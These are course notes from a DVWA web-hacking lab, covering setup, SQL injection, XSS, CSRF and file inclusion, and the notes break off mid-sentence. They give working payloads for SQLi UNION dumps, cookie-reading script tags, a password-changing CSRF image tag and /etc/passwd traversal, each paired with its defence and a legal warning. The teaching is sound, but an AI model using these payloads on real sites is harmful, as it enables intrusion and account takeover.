
# Session 9 – Practical Web Application Hacking with DVWA

## Part 1 – Lab Setup, Ground Rules, DVWA Security Levels, and Attack Overview

**Course:** CDAC Industry Exposure Program – Cybersecurity
**Session Topic:** Web Application Hacking with DVWA
**Session Type:** Practical / Hands-on Lab

---

# Overview

This session is a practical web application hacking lab using **DVWA**, which stands for **Damn Vulnerable Web Application**.

DVWA is an intentionally vulnerable web application created for learning web application security in a safe and controlled environment.

The purpose of this session is to understand four classic web application vulnerabilities:

1. SQL Injection
2. Cross-Site Scripting
3. Cross-Site Request Forgery
4. File Inclusion

The session also connects offensive testing with defensive monitoring using **Wazuh**, a SIEM/XDR platform.

The main idea of the session is:

```text
Attack the vulnerable application
        ↓
Understand the root cause
        ↓
Learn the defense
        ↓
See how a SIEM can detect it
```

---

# Important Legal and Ethical Ground Rule

The first and most important rule of this session is:

```text
Attack DVWA only.
Do not attack any real website.
```

DVWA is legal to attack because:

* It is intentionally vulnerable.
* It is installed on your own Kali machine.
* It runs locally or inside your own lab.
* You own the target.
* The environment is isolated.

The same payloads used against a real website without permission are illegal.

---

# Why DVWA Is Safe for Practice

DVWA is designed for controlled learning.

It allows students to safely test vulnerabilities such as:

* SQL Injection
* XSS
* CSRF
* File Inclusion
* Command Injection
* File Upload
* Brute Force

The application is deliberately insecure.

That means when an exploit works in DVWA, it is not because you discovered a new bug. It is because the application was intentionally built to demonstrate that bug.

---

# Legal Difference Between Lab Testing and Real Attacks

## Legal Lab Testing

```text
Target: Your own DVWA
Permission: You own it
Purpose: Learning
Impact: Controlled
Legal Status: Allowed
```

---

## Illegal Real-World Attack

```text
Target: Public website
Permission: No
Purpose: Unauthorized testing or attack
Impact: Unknown
Legal Status: Illegal
```

---

# Why This Distinction Matters

The tools and payloads may be the same.

For example:

```text
1' OR '1'='1
```

can be used in DVWA legally.

But using the same payload on a website you do not own can be considered unauthorized access.

In cybersecurity, legality depends heavily on:

* Permission
* Scope
* Ownership
* Written authorization
* Intent
* Environment

---

# Step 0 – Standing Up the Target on Kali

Before performing attacks, the vulnerable target must be installed and running.

The PPT gives two installation options.

---

# Option 1 – Kali Package Shortcut

If the DVWA package is available in Kali:

```bash
sudo apt install -y dvwa
sudo dvwa-start
```

---

## Explanation

### `sudo`

Runs the command with administrator privileges.

DVWA setup requires administrative permissions because it may install packages, configure services, and modify web server files.

---

### `apt install`

Uses the Debian/Kali package manager to install software.

---

### `-y`

Automatically answers "yes" to installation prompts.

---

### `dvwa`

The package name.

---

### `dvwa-start`

Starts DVWA and its required services.

---

# Option 2 – Manual Installation

The PPT also gives a manual installation method.

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa
sudo systemctl start apache2 mariadb
```

---

# Explanation of Manual Setup

## `cd /var/www/html`

This changes the directory to the Apache web root.

On many Linux systems, Apache serves web files from:

```text
/var/www/html
```

If a folder is placed here, it can usually be accessed through the browser.

Example:

```text
/var/www/html/dvwa
```

becomes:

```text
http://127.0.0.1/dvwa/
```

---

## `sudo git clone https://github.com/digininja/DVWA.git dvwa`

This downloads the DVWA source code from GitHub.

### `git clone`

Downloads a copy of a Git repository.

### `digininja/DVWA`

The official DVWA repository.

### `dvwa`

The local folder name.

So the command means:

```text
Download DVWA into /var/www/html/dvwa
```

---

## `sudo systemctl start apache2 mariadb`

This starts the services needed by DVWA.

---

# Apache2

Apache is the web server.

It serves the DVWA web pages to the browser.

Without Apache, visiting:

```text
http://127.0.0.1/dvwa/
```

will not work.

---

# MariaDB

MariaDB is the database server.

DVWA uses a database to store:

* Users
* Password hashes
* Guestbook entries
* Application data

Without MariaDB, SQL Injection exercises cannot work properly.

---

# Accessing DVWA

After starting the services, open the browser and visit:

```text
http://127.0.0.1/dvwa/
```

---

# What is 127.0.0.1?

```text
127.0.0.1
```

is called the loopback address.

It means:

```text
This same machine
```

So when you visit:

```text
http://127.0.0.1/dvwa/
```

you are not visiting the internet.

You are accessing the DVWA application running on your own Kali machine.

---

# Login Credentials

Default DVWA login:

```text
Username: admin
Password: password
```

These credentials are intentionally weak because DVWA is a learning lab.

---

# DVWA Setup Page

After logging in, go to the setup page and click:

```text
Create / Reset Database
```

This initializes the DVWA database.

It creates the tables and sample data required for the vulnerabilities.

---

# Setting Security Level to Low

Go to:

```text
DVWA Security
```

Set security level to:

```text
Low
```

---

# Why Start with Low Security?

The purpose of the Low level is to show the raw vulnerability clearly.

At Low security:

* Input is poorly validated.
* Output is not encoded.
* Anti-CSRF tokens are missing.
* File paths are trusted.
* User input is directly passed into dangerous operations.

This makes the vulnerability easy to observe.

---

# DVWA Security Levels

DVWA has multiple security levels.

Each level demonstrates a different degree of protection.

---

# Low

```text
No meaningful protection.
```

This level is used to understand the vulnerability in its simplest form.

Example:

In SQL Injection Low level, user input may be directly placed into a SQL query.

---

# Medium

```text
Weak protection.
```

This level adds some defenses, but they are bypassable.

Example:

A filter may block obvious strings, but attackers can modify payloads to bypass it.

---

# High

```text
Stronger protection.
```

This level is closer to real-world applications.

Attacks may require more careful payload construction.

---

# Impossible

```text
Secure implementation.
```

This is the most important level for learning defense.

It shows what properly fixed code looks like.

---

# The Most Important DVWA Learning Habit

The PPT highlights a powerful habit:

```text
Exploit on Low
        ↓
View Source
        ↓
Compare Low vs Impossible
        ↓
Learn the defense
```

This means DVWA should not only be used for exploitation.

It should also be used to understand secure coding.

---

# Why Compare Low vs Impossible Source Code?

Because the difference between the two shows exactly how the vulnerability is fixed.

Example:

For SQL Injection:

Low may use unsafe string concatenation.

Impossible may use prepared statements.

That difference teaches the real defense.

---

# The Four Main Attacks Covered

The session focuses on four classic OWASP-style web vulnerabilities.

---

# 1. SQL Injection

SQL Injection occurs when user input is inserted into a database query without proper separation between data and code.

The attacker sends SQL instead of normal input.

Impact:

* Dump database records
* Extract usernames
* Extract password hashes
* Read sensitive tables
* Sometimes modify or delete data

---

# 2. Cross-Site Scripting

Cross-Site Scripting, or XSS, occurs when attacker-controlled JavaScript runs in another user's browser.

Impact:

* Steal session cookies
* Deface pages
* Redirect users
* Perform phishing
* Capture keystrokes

---

# 3. Cross-Site Request Forgery

CSRF occurs when an attacker tricks a logged-in user's browser into performing an unwanted action.

The attacker does not need to steal the session cookie.

Instead, the victim's browser automatically sends it.

Impact:

* Change password
* Change email
* Transfer money
* Modify account settings

---

# 4. File Inclusion

File Inclusion occurs when user input is used to decide which file the application loads.

If not controlled properly, attackers may force the application to load sensitive files.

Impact:

* Read `/etc/passwd`
* Read configuration files
* Expose credentials
* In some cases, execute remote code

---

# Common Root Cause Across All Four Bugs

Although these vulnerabilities look different, they share one root cause:

```text
The application trusted user input.
```

---

## SQL Injection

The app trusted user input as part of a SQL query.

---

## XSS

The app trusted user input and displayed it as HTML/JavaScript.

---

## CSRF

The app trusted that every request came intentionally from the user.

---

## File Inclusion

The app trusted user input as a file path.

---

# Core Security Principle

The session reinforces one major rule:

```text
Never trust the client.
```

The client includes:

* Browser
* URL
* Form input
* Cookies
* Headers
* JavaScript
* Hidden fields
* Query parameters

Everything from the client can be modified.

---

# Session Attack Rhythm

For each vulnerability, the session follows the same rhythm:

```text
Concept
        ↓
Hands-on exploitation
        ↓
Impact
        ↓
Defense
        ↓
Compare Low vs Impossible
```

This structure helps connect attack and defense together.

---

# Why This Practical Session Matters

Earlier sessions introduced:

* Reconnaissance
* Scanning
* HTTP requests
* Intercepting proxies
* Burp Suite
* Web security concepts

This session turns those concepts into hands-on exploitation.

Instead of only reading about SQL Injection or XSS, students actually execute payloads in DVWA and observe the result.

---

# Key Takeaways from Part 1

* DVWA is an intentionally vulnerable web application.
* Attacks must only be performed on your own lab.
* The same payloads are illegal on unauthorized public websites.
* DVWA runs locally on Kali through Apache and MariaDB.
* Default login is `admin / password`.
* Security level should be set to Low for initial learning.
* DVWA security levels show the evolution from vulnerable code to secure code.
* The best learning method is to exploit Low and compare it with Impossible.
* The four major vulnerabilities in this session are SQL Injection, XSS, CSRF, and File Inclusion.
* All four vulnerabilities come from trusting user input.


# Session 9 – Practical Web Application Hacking with DVWA
## Part 2 – Attack 1: SQL Injection (SQLi)

---

# Attack 1 – SQL Injection

## Introduction

The first practical attack demonstrated during the session was **SQL Injection (SQLi)**.

The instructor introduced SQL Injection as one of the **oldest, most dangerous, and still one of the most common web application vulnerabilities**.

The PPT describes SQL Injection as:

> **"Send SQL instead of data."** :contentReference[oaicite:0]{index=0}

Normally, an application expects user input such as:

```text
1
```

or

```text
John
```

However, in SQL Injection, the attacker provides **SQL commands instead of ordinary data**.

If the application blindly trusts that input, the database interprets it as SQL code.

Instead of simply retrieving one record, the attacker may:

- Dump the database
- Read usernames
- Obtain password hashes
- Read confidential information
- Modify records
- Delete information
- Sometimes even execute operating system commands (depending on database configuration)

---

# What is SQL?

SQL stands for:

```text
Structured Query Language
```

SQL is the standard language used to communicate with relational databases.

Applications use SQL queries to:

- Retrieve information
- Insert data
- Update records
- Delete records

Example:

```sql
SELECT * FROM users;
```

retrieves all records from the users table.

---

# How a Web Application Normally Works

Suppose a user enters:

```text
User ID = 1
```

The application constructs a SQL query:

```sql
SELECT first_name, last_name
FROM users
WHERE user_id = '1';
```

Database execution:

```text
Input

↓

SQL Query

↓

Database

↓

One User Returned
```

Everything works correctly.

---

# The Root Cause of SQL Injection

The vulnerability occurs when **user input is directly concatenated into the SQL query**.

Example:

```php
$query = "SELECT * FROM users WHERE user_id='$id'";
```

Notice that:

```text
$id
```

comes directly from the browser.

No validation.

No sanitization.

No parameterization.

The application trusts the client.

---

# Why This is Dangerous

Suppose the attacker enters:

```text
1' OR '1'='1
```

The application creates:

```sql
SELECT *
FROM users
WHERE user_id='1'
OR
'1'='1';
```

Let's understand this.

---

# Breaking the Query

Original:

```sql
WHERE user_id='1'
```

returns:

```text
Only User 1
```

Now consider:

```sql
OR '1'='1'
```

Question:

Is

```text
1 = 1
```

true?

Yes.

Therefore:

```sql
WHERE
user_id='1'
OR
TRUE
```

Anything OR TRUE is always TRUE.

Therefore:

```text
Every row matches.
```

Instead of returning one user,

the database returns **every user**.

---

# Why Does the Single Quote Matter?

The instructor emphasized that:

> **A quote lets you escape from data into SQL code.**

Suppose the query is:

```sql
WHERE user_id='1'
```

The attacker enters:

```text
1'
```

The single quote closes the string.

Everything after that becomes SQL syntax.

This is the key to many SQL Injection attacks.

---

# Practical Demonstration 1 – Baseline Query

The instructor first demonstrated the normal case.

User enters:

```text
1
```

DVWA returns:

```text
User 1
```

Purpose:

Always establish a baseline before attacking.

If the application behaves normally with valid input,

it becomes easier to understand the effect of malicious payloads.

---

# Practical Demonstration 2 – Always True Condition

Payload:

```text
1' OR '1'='1
```

The generated query becomes:

```sql
SELECT *
FROM users
WHERE user_id='1'
OR
'1'='1';
```

Since:

```text
'1'='1'
```

is always TRUE,

the WHERE clause matches every record.

Result:

```text
Entire users table returned.
```

Instead of seeing:

```text
One user
```

the attacker sees:

```text
All users.
```

---

# Understanding Boolean Logic

The payload relies on Boolean logic.

Example:

```text
TRUE OR FALSE

↓

TRUE
```

Example:

```text
TRUE OR TRUE

↓

TRUE
```

Example:

```text
FALSE OR TRUE

↓

TRUE
```

Therefore:

```sql
WHERE something
OR TRUE
```

always returns every row.

---

# Practical Demonstration 3 – UNION Attack

Payload:

```text
1' UNION SELECT user, password FROM users --
```

This is much more powerful.

---

# What is UNION?

SQL provides an operator called:

```sql
UNION
```

Purpose:

Combine the results of two SELECT statements.

Example:

Query A:

```sql
SELECT first_name,last_name
```

Query B:

```sql
SELECT user,password
```

UNION merges them into one result.

---

# Why Attackers Use UNION

Instead of retrieving ordinary application data,

the attacker retrieves:

```text
Database usernames

Password hashes
```

The database executes:

```sql
SELECT ...

UNION

SELECT user,password
FROM users;
```

Now DVWA displays:

```text
admin

5f4dcc3b5aa765d61d8327deb882cf99
```

Notice:

The passwords are not shown in plaintext.

They are stored as **hashes**.

---

# Why Password Hashes Matter

A hash is a one-way mathematical representation of a password.

Example:

Password:

```text
password
```

Hash:

```text
5f4dcc3b5aa765d61d8327deb882cf99
```

The database stores the hash instead of the original password.

Attackers may later attempt:

- Dictionary attacks
- Brute force
- Rainbow tables

to recover the original password.

---

# Practical Demonstration 4 – Database Fingerprinting

Payload:

```text
1' UNION SELECT null, version() --
```

---

# Purpose

The attacker wants to know:

```text
Which database is running?
```

Instead of dumping data,

the attacker retrieves:

```sql
version()
```

Possible output:

```text
MariaDB 10.5

MySQL 8.0

PostgreSQL 14

Oracle 19c
```

---

# Why Version Information is Valuable

Knowing the database version allows attackers to:

- Search CVEs
- Search exploits
- Identify default behavior
- Tailor payloads

Example:

```text
MySQL 5.5

↓

Known vulnerabilities
```

---

# Understanding the Double Dash (--)

Notice the payload:

```text
--
```

This is a SQL comment.

Everything after:

```sql
--
```

is ignored by the database.

Purpose:

Remove the remainder of the original query.

Example:

Original query:

```sql
SELECT *
FROM users
WHERE user_id='1'
```

Payload:

```text
1' UNION SELECT user,password FROM users --
```

The comment prevents SQL syntax errors caused by the remaining quote.

---

# Real-World Impact of SQL Injection

A successful SQL Injection may allow attackers to:

- Read customer databases.
- Dump usernames.
- Obtain password hashes.
- Access payment records.
- Read confidential documents.
- Modify records.
- Delete tables.
- Sometimes gain remote code execution.

Many historic breaches began with SQL Injection.

---

# SQL Injection Risk Progression

```text
User Input

↓

Unsafe SQL Query

↓

SQL Injection

↓

Database Access

↓

Sensitive Data Exposure

↓

Account Compromise

↓

Possible Full System Compromise
```

---

# How to Defend Against SQL Injection

The PPT lists several important defenses.

---

## 1. Parameterized Queries (Prepared Statements)

This is the **most effective defense**.

Instead of building SQL like:

```php
$query =
"SELECT * FROM users WHERE id='$id'";
```

prepared statements separate:

```text
SQL Code

and

User Data
```

The database never treats user input as executable SQL.

Even if the user enters:

```text
1' OR '1'='1
```

it is interpreted as ordinary text.

---

## 2. Least Privilege Database Accounts

Applications should connect using database accounts with minimal permissions.

For example:

A public website usually needs:

- SELECT
- INSERT
- UPDATE

It rarely needs:

- DROP TABLE
- CREATE USER
- SUPER

Reducing privileges limits damage.

---

## 3. Input Validation

Reject:

- Unexpected characters
- Invalid formats
- Excessively long inputs

Although validation is useful,

it **must never replace parameterized queries**.

---

## 4. Web Application Firewall (WAF)

A WAF examines incoming HTTP requests.

It may detect patterns like:

```text
UNION SELECT

OR 1=1

SLEEP()

BENCHMARK()
```

and block them.

However,

WAFs provide **defense in depth**, not a primary fix.

---

# Compare Low vs Impossible

The instructor encouraged students to:

```text
Exploit Low

↓

Click "View Source"

↓

Open Impossible

↓

Compare Both
```

This comparison shows:

Low:

```php
SQL built by concatenation
```

Impossible:

```php
Prepared statements
```

This is one of the most valuable learning features of DVWA.

---

# Root Cause

The vulnerability exists because:

```text
The application trusted user input.
```

The user supplied:

```text
SQL Code
```

The application assumed it was:

```text
Ordinary Data
```

---

# Key Takeaways

- SQL Injection occurs when user input becomes part of a SQL query.
- A single quote (`'`) can terminate a string and allow SQL code injection.
- `OR '1'='1'` creates an always-true condition that returns all records.
- `UNION SELECT` allows attackers to retrieve data from other tables.
- `version()` helps fingerprint the database server.
- `--` comments out the remainder of the SQL query.
- Passwords should be stored as hashes, not plaintext.
- Prepared statements are the primary defense against SQL Injection.
- Least-privilege database accounts and WAFs provide additional protection.
- The best learning method in DVWA is to compare **Low** and **Impossible** source code.

# Session 9 – Practical Web Application Hacking with DVWA
## Part 3 – Attack 2: Cross-Site Scripting (XSS)

---

# Attack 2 – Cross-Site Scripting (XSS)

## Introduction

The second attack demonstrated in the practical session is **Cross-Site Scripting (XSS)**.

Unlike SQL Injection, which targets the **server-side database**, XSS targets the **client-side browser**.

The PPT summarizes XSS as:

> **"Inject JavaScript into a page."** :contentReference[oaicite:0]{index=0}

The attacker injects malicious JavaScript into a vulnerable web application. When another user visits the affected page, the browser executes the attacker's JavaScript as if it were legitimate code from the website.

This makes XSS one of the most dangerous client-side vulnerabilities.

---

# What is Cross-Site Scripting?

Cross-Site Scripting is a vulnerability in which an application includes **untrusted user input** in a web page **without proper output encoding or escaping**.

As a result, the browser interprets attacker-controlled input as executable JavaScript.

Instead of displaying:

```text
<script>alert('Hello')</script>
```

as text,

the browser executes:

```javascript
alert("Hello");
```

---

# Why Does XSS Work?

Browsers are designed to execute JavaScript embedded within HTML pages.

Normally:

```html
<script>
console.log("Welcome");
</script>
```

is legitimate JavaScript.

If the application allows an attacker to inject their own `<script>` tag,

the browser cannot distinguish between:

- Legitimate JavaScript
- Malicious JavaScript

Both execute with the same privileges within that website.

---

# Why is XSS Dangerous?

JavaScript running inside the victim's browser can:

- Read page contents
- Modify HTML
- Send requests
- Capture keyboard input
- Redirect users
- Access browser storage
- Perform actions as the logged-in user

The browser trusts JavaScript delivered by the website.

If an attacker injects JavaScript into that website,

the victim's browser also trusts the attacker's code.

---

# Types of Cross-Site Scripting

The PPT introduces three types of XSS.

---

# 1. Reflected XSS

## Definition

Reflected XSS occurs when malicious input is immediately reflected back in the server's response without being stored.

Flow:

```text
Attacker

↓

Sends malicious input

↓

Server reflects input

↓

Victim's browser executes JavaScript
```

---

## Characteristics

- Not stored permanently.
- Usually delivered through URLs or form parameters.
- Requires the victim to click a specially crafted link.

---

## Example

Attacker sends:

```text
https://example.com/search?q=<script>alert(1)</script>
```

If the application displays:

```html
You searched for:

<script>alert(1)</script>
```

the browser executes:

```javascript
alert(1)
```

instead of displaying it as text.

---

# 2. Stored XSS

## Definition

Stored XSS occurs when malicious JavaScript is permanently stored on the server.

Examples:

- Guestbooks
- Forums
- Comment sections
- User profiles
- Chat messages

The server stores the malicious input.

Every future visitor receives and executes it.

---

## Flow

```text
Attacker

↓

Submits malicious script

↓

Server stores it

↓

Victim opens page

↓

Browser executes attacker's script
```

---

## Why Stored XSS is More Dangerous

Unlike reflected XSS,

the attacker does not need to convince every victim individually.

Once stored,

every visitor becomes a victim automatically.

---

# 3. DOM-Based XSS

## Definition

DOM-Based XSS occurs entirely inside the browser.

The malicious input never reaches the server.

Instead,

client-side JavaScript reads attacker-controlled input and inserts it into the page unsafely.

---

## Example

JavaScript:

```javascript
document.getElementById("msg").innerHTML =
location.hash;
```

URL:

```text
example.com/#<script>alert(1)</script>
```

The browser inserts:

```html
<script>alert(1)</script>
```

into the page,

executing the script.

The server never sees the payload.

---

# Practical Demonstration 1 – Reflected XSS

Navigate to:

```text
DVWA → XSS (Reflected)
```

Security Level:

```text
Low
```

---

## Payload

```html
<script>alert('XSS')</script>
```

---

## What Happens?

The application takes user input,

places it into the response,

and returns:

```html
Welcome

<script>alert('XSS')</script>
```

The browser parses the HTML,

finds the `<script>` tag,

and executes:

```javascript
alert("XSS");
```

A popup appears.

---

# Why Start with alert()?

The instructor deliberately begins with:

```javascript
alert()
```

because it provides immediate visual confirmation.

It demonstrates:

```text
JavaScript execution
```

without performing anything harmful.

---

# Practical Demonstration 2 – Cookie Theft

Payload:

```html
<script>alert(document.cookie)</script>
```

---

## What is document.cookie?

JavaScript provides:

```javascript
document.cookie
```

which returns cookies belonging to the current website.

Example:

```text
PHPSESSID=abc123xyz
```

These cookies often contain:

- Session IDs
- Preferences
- Authentication tokens

---

# Why Cookies Matter

Many web applications use cookies to maintain login sessions.

Example:

```text
User logs in

↓

Server creates Session ID

↓

Session stored in cookie

↓

Browser sends cookie with every request
```

If an attacker steals the session cookie,

they may impersonate the victim.

This is called:

```text
Session Hijacking
```

---

# HttpOnly Protection

Modern applications often mark session cookies as:

```text
HttpOnly
```

This prevents JavaScript from reading them.

Without HttpOnly:

```javascript
document.cookie
```

returns the session.

With HttpOnly:

```javascript
document.cookie
```

cannot access protected cookies.

This significantly reduces the impact of XSS.

---

# Practical Demonstration 3 – Stored XSS

Navigate to:

```text
DVWA → XSS (Stored)
```

The application contains a guestbook.

Payload:

```html
<script>alert('stored xss')</script>
```

Submit the message.

---

## What Happens?

Unlike reflected XSS,

the script is saved inside the database.

Every future visitor loading the guestbook executes:

```javascript
alert("stored xss");
```

even though they never entered the payload.

---

# Why Stored XSS is Critical

Suppose an administrator visits the page.

Their browser executes the attacker's JavaScript.

Possible consequences:

- Session theft
- Administrative account compromise
- Defacement
- Internal application access

Stored XSS often affects privileged users.

---

# Real-World Impact of XSS

The PPT highlights several consequences.

Let's expand them.

---

## Session Hijacking

Steal session cookies.

Impersonate the victim.

---

## Keylogging

JavaScript can record keyboard input.

Potentially capturing:

- Passwords
- Credit card numbers
- Personal information

---

## Page Defacement

Modify HTML dynamically.

Example:

Replace:

```text
Welcome User
```

with

```text
This Website Has Been Hacked
```

---

## Phishing

Display a fake login form.

Victims unknowingly submit credentials to the attacker.

---

## Browser Redirection

Redirect users to:

- Malware websites
- Fake banking pages
- Credential harvesting sites

---

# Why Output Encoding Prevents XSS

Suppose the application receives:

```html
<script>alert(1)</script>
```

Without encoding:

Browser interprets:

```html
<script>
```

as executable JavaScript.

With encoding:

The application converts:

```html
<
```

into:

```html
&lt;
```

Result:

```text
<script>alert(1)</script>
```

appears as harmless text.

The browser no longer executes it.

---

# Content Security Policy (CSP)

The PPT lists CSP as an important defense.

Content Security Policy is an HTTP response header that restricts where scripts may originate.

Example:

```http
Content-Security-Policy:
script-src 'self';
```

This instructs the browser:

```text
Only execute JavaScript served by this website.
```

Inline attacker scripts are blocked.

---

# Input Validation vs Output Encoding

Many beginners confuse these concepts.

Input Validation:

Checks whether input is acceptable.

Example:

Maximum length.

Allowed characters.

---

Output Encoding:

Transforms dangerous characters before displaying them.

Example:

```text
<
```

becomes:

```text
&lt;
```

For XSS,

output encoding is the primary defense.

---

# Compare Low vs Impossible

As with SQL Injection,

students should compare:

```text
Low

↓

Impossible
```

Low:

Displays raw input.

Impossible:

Properly encodes output before displaying it.

This comparison teaches secure coding practices.

---

# Root Cause

XSS exists because:

```text
The application trusted user input and displayed it as executable HTML.
```

---

# Key Takeaways

- XSS allows attackers to execute JavaScript inside another user's browser.
- Reflected XSS is immediate and usually delivered through URLs or forms.
- Stored XSS is permanently saved on the server and affects every visitor.
- DOM-Based XSS occurs entirely within client-side JavaScript.
- `alert()` is commonly used to demonstrate successful code execution.
- `document.cookie` illustrates how attackers may attempt to steal session cookies.
- HttpOnly cookies reduce the risk of session theft.
- Output encoding is the primary defense against XSS.
- Content Security Policy (CSP) adds an additional layer of protection.
- Comparing **Low** and **Impossible** source code in DVWA demonstrates how secure output handling prevents XSS.

  # Session 9 – Practical Web Application Hacking with DVWA
## Part 4 – Attack 3: Cross-Site Request Forgery (CSRF)

---

# Attack 3 – Cross-Site Request Forgery (CSRF)

## Introduction

The third attack demonstrated in this session is **Cross-Site Request Forgery (CSRF)**.

Unlike SQL Injection or Cross-Site Scripting, CSRF does **not** exploit weaknesses in the application's code execution or database handling.

Instead, CSRF exploits **the trust that a web application places in a user's authenticated browser session**.

The PPT summarizes CSRF as:

> **"Trick a logged-in user into performing an unintended action."** :contentReference[oaicite:0]{index=0}

This means the attacker never needs to know the victim's password.

Instead, the attacker abuses the fact that the victim is already logged into the application.

---

# Understanding Authentication Sessions

Whenever a user logs into a web application:

```text
Username + Password

↓

Authentication Successful

↓

Server Creates Session

↓

Browser Stores Session Cookie

↓

Browser Automatically Sends Cookie
```

Example:

```
Cookie:

PHPSESSID=ab45f98d712...
```

The browser automatically includes this cookie in every future request.

The user does not have to enter their password again.

---

# The Core Idea Behind CSRF

The browser cannot distinguish between:

```text
A request intentionally made by the user
```

and

```text
A request triggered by a malicious webpage.
```

If the victim is already logged in,

their browser automatically sends:

- Session Cookie
- Authentication Token (if no CSRF protection exists)
- Other required headers

As far as the server is concerned,

the request appears legitimate.

---

# How CSRF Works

The attack generally follows this sequence:

```text
Victim Logs Into Website

↓

Session Cookie Stored

↓

Victim Visits Malicious Website

↓

Malicious Website Sends Hidden Request

↓

Browser Automatically Includes Session Cookie

↓

Target Website Executes Request

↓

Action Completed
```

The victim never realizes anything happened.

---

# Real-Life Analogy

Imagine you have already entered a secure office building using your ID card.

While you are inside,

someone secretly hands you a paper and tells you:

> "Please place this in the manager's inbox."

Because you are already authorized,

security allows you through.

The manager assumes:

> "This must have been submitted by an authorized employee."

Similarly,

CSRF abuses the trust associated with an authenticated session.

---

# Why the Browser Is the Real Victim

One important concept often misunderstood is:

The attacker does **not** directly communicate with the target website.

Instead:

```text
Attacker

↓

Victim's Browser

↓

Target Website
```

The browser unknowingly becomes the attacker's tool.

---

# Practical Demonstration – DVWA CSRF Module

Navigate to:

```text
DVWA

↓

CSRF
```

Security Level:

```text
Low
```

The application contains a simple password change form.

Normally,

the user enters:

- Current Password
- New Password
- Confirm Password

and submits the form.

---

# Observing the Request

Using Burp Suite or the browser,

the password change request appears similar to:

```http
GET /dvwa/vulnerabilities/csrf/

password_new=hacker123

password_conf=hacker123

Change=Change
```

Notice something important.

There is:

- No CSRF Token
- No Request Validation
- No Origin Verification

The application trusts every request.

---

# Crafting a Malicious Request

An attacker creates a fake HTML page.

Example:

```html
<img src="http://victim/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change">
```

At first glance,

this looks like a harmless image.

However,

the browser treats the `src` attribute as a URL to request.

When the page loads:

```text
Browser Requests Image

↓

Actually Sends Password Change Request

↓

Includes Session Cookie

↓

Password Changes
```

No image is needed.

The request itself performs the attack.

---

# Why Does This Work?

Because the victim is already logged in.

The browser automatically includes:

```
Cookie:

PHPSESSID=abc123
```

The server checks:

```text
Valid Session?

↓

Yes

↓

Execute Request
```

The server never realizes:

The request originated from an attacker's webpage.

---

# Another CSRF Example

Suppose an online banking application performs transfers using:

```http
GET

/transfer?

amount=10000

to=987654321
```

An attacker could embed:

```html
<img src="https://bank.com/transfer?amount=10000&to=987654321">
```

If the victim is already logged in,

the browser sends:

- Session Cookie
- Authentication Information

The transfer may complete automatically.

This is why sensitive operations should **never** rely solely on authentication cookies.

---

# Common CSRF Targets

Attackers commonly target operations such as:

- Password changes
- Email changes
- Profile updates
- Money transfers
- User creation
- Permission modifications
- API requests
- Device registration

The more sensitive the action,

the more dangerous CSRF becomes.

---

# Why GET Requests Increase Risk

According to HTTP principles:

GET requests should be:

```text
Safe

Read-only

No State Changes
```

Examples:

```
View Profile

Search Products

Read Messages
```

Changing data through GET requests is considered poor design.

Sensitive operations should instead use:

```
POST

PUT

PATCH
```

along with additional security mechanisms.

---

# Primary Defense – CSRF Tokens

The PPT highlights **CSRF Tokens** as the primary defense.

A CSRF token is:

- Random
- Unique
- Unpredictable
- Generated by the server

Example:

```html
<input type="hidden"

name="csrf_token"

value="8df79ab291fbe23">
```

When the form is submitted,

the server checks:

```text
Submitted Token

↓

Matches Session Token?

↓

Yes → Accept

No → Reject
```

An attacker cannot guess the token.

---

# Why Tokens Stop the Attack

Suppose the attacker creates:

```html
<img src="password_change?...">
```

The request contains:

```
No Valid CSRF Token
```

The server immediately rejects it.

Even though:

- Session Cookie is valid.
- User is logged in.

The action fails.

---

# SameSite Cookies

Modern browsers support:

```text
SameSite
```

cookie attributes.

Example:

```
Set-Cookie:

PHPSESSID=abc123;

SameSite=Strict
```

This instructs the browser:

```text
Do not send this cookie
during cross-site requests.
```

Even if the attacker tricks the browser,

the authentication cookie never leaves.

Without the cookie,

the request fails.

---

# Origin and Referer Validation

Another defense is verifying:

```
Origin Header

or

Referer Header
```

Example:

Legitimate request:

```
Origin:

https://company.com
```

Attacker's request:

```
Origin:

https://evil.com
```

The server detects the mismatch and rejects the request.

---

# User Confirmation

Critical actions should require:

- Current Password
- OTP
- MFA
- Re-authentication

Example:

Changing password should ask:

```
Enter Current Password
```

Even if CSRF occurs,

the attacker cannot supply the current password.

---

# Compare Low vs Impossible

Low Security:

- No CSRF token
- No origin verification
- Request immediately accepted

Impossible Security:

- Random CSRF token
- Token validation
- Proper request handling

DVWA allows students to compare the implementation and understand how CSRF protection is added.

---

# Difference Between XSS and CSRF

| XSS | CSRF |
|------|------|
| Executes attacker JavaScript | Tricks browser into sending requests |
| Targets victim's browser | Targets authenticated session |
| Requires injection point | Requires logged-in victim |
| Can steal cookies | Uses existing cookies |
| Client-side code execution | Unauthorized state-changing requests |

---

# Root Cause

The application assumes:

```text
Every authenticated request

↓

Was intentionally made

↓

By the user.
```

This assumption is incorrect.

The browser automatically sends authentication cookies,

making forged requests appear legitimate.

---

# Key Takeaways

- CSRF exploits the trust placed in authenticated browser sessions.
- The attacker never needs to know the victim's password.
- Browsers automatically send session cookies with requests.
- Without CSRF protection, forged requests appear legitimate.
- Password changes, profile updates, and financial transactions are common CSRF targets.
- CSRF tokens are the primary defense.
- SameSite cookies significantly reduce CSRF risk.
- Origin and Referer validation provide additional protection.
- Sensitive actions should require re-authentication or MFA.
- Comparing **Low** and **Impossible** levels in DVWA demonstrates how proper request validation prevents CSRF.

  # Session 9 – Practical Web Application Hacking with DVWA
## Part 5 – Attack 4: File Inclusion (LFI & RFI)

---

# Attack 4 – File Inclusion

## Introduction

The fourth and final attack demonstrated during this practical session is **File Inclusion**.

Unlike SQL Injection, which targets databases, or XSS, which targets browsers, File Inclusion targets the **application's file handling mechanism**.

The PPT summarizes this attack as:

> **"Load unintended files."** :contentReference[oaicite:0]{index=0}

Many web applications dynamically load pages based on user input.

For example:

```text
?page=home.php
```

The application reads:

```text
home.php
```

and displays the Home page.

If the application trusts this parameter without validation,

an attacker may supply a completely different filename.

Instead of loading:

```text
home.php
```

the attacker may attempt to load:

```text
../../../../etc/passwd
```

or even a remote file (depending on configuration).

---

# What is File Inclusion?

File Inclusion occurs when an application uses user-controlled input to determine which file should be loaded.

Example PHP code:

```php
include($_GET['page']);
```

The application expects:

```text
?page=home.php
```

However,

the attacker supplies:

```text
?page=../../../../etc/passwd
```

The application includes a completely different file.

---

# Why Does This Happen?

The root cause is the same as every previous vulnerability:

```text
The application trusted user input.
```

Instead of validating:

```text
